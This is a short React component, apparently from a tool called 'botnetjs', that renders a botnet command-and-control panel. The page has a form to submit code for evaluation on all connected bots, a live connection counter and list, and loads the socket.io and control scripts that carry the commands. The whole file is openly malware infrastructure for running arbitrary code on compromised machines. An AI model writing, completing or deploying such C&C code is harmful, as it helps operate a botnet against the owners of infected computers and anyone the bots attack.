var React = require('react')
var DefaultLayout = require('./layouts/default')

var ControlPanel = React.createClass({
    render: function () {
        return (
                <DefaultLayout title={this.props.title}>
                    <div>This is the control panel.</div>
                    <header>botnetjs C&amp;C</header>
                    <div class="controls">
                        <form onSubmit="evalAllBots()">
                        <textarea name="evalme" value="Enter the code to eval here." />
                        <input type="submit" value="Submit" />
                        </form>                    
                    </div>
                    <div class="connections_wrapper">
                        <div class="connections_box">
                            <div id="connections_count">-1</div> connections
                        </div>
                        <div id="connections_list"></div>
                    </div>
                    <script src="/socket.io/socket.io.js"></script>
                    <script src="/botnetjs/control.js"></script>
                </DefaultLayout>
               )
    }
})

module.exports = ControlPanel
